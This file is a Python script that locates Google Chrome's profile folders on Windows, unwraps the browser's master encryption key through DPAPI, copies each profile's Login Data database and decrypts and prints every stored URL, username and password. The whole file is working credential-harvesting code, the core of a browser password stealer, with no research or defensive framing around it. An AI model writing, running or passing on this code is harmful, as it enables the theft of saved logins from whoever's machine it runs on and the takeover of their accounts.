import os
import re
import sys
import json
import base64
import sqlite3
from win32 import win32crypt
from Crypto.Cipher import AES
import shutil

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data" % (os.environ['USERPROFILE']))

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(f"Error getting secret key: {e}")
        sys.exit(1)

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        return decrypted_pass.decode()
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return None

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(f"Error connecting to database: {e}")
        return None

if __name__ == '__main__':
    try:
        secret_key = get_secret_key()
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile.*|^Default$", element)]
        
        for folder in folders:
            chrome_path_login_db = os.path.normpath(r"%s\\%s\\Login Data" % (CHROME_PATH, folder))
            if os.path.exists(chrome_path_login_db):
                conn = get_db_connection(chrome_path_login_db)
                if conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url, username, ciphertext = login
                        if url and username and ciphertext:
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            if decrypted_password:
                                print(f"Sequence: {index}")
                                print(f"URL: {url}\nUser Name: {username}\nPassword: {decrypted_password}")
                                print("*" * 50)
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
                else:
                    print("Failed to connect to the login database.")
            else:
                print(f"No login database found in {chrome_path_login_db}.")
    except Exception as e:
        print(f"An error occurred: {e}")
        if os.path.exists("Loginvault.db"):
            os.remove("Loginvault.db")
        sys.exit(1)
